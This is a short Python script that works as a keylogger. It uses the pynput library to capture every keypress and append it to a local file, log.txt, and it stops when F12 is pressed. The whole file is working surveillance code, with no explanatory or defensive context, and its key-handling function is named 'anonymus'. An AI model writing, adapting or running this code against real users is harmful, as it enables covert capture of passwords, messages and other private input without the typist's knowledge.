from pynput.keyboard import Listener


def convertData(key):
    if (key == "Key.ctr_l" or key == "Key.shift"):
        key = ""
    if (key == "Key.space"):
        key = " "
    if (key == "Key.enter"):
        key = "\n"
    return key.replace("'", "")

def anonymus(key):
    key = str(key)
    if (key == "Key.f12"):
        raise SystemExit(0)

    with open("log.txt", "a") as file:
        file.write(convertData(key))

with Listener(on_press=anonymus) as listener:
    listener.join()
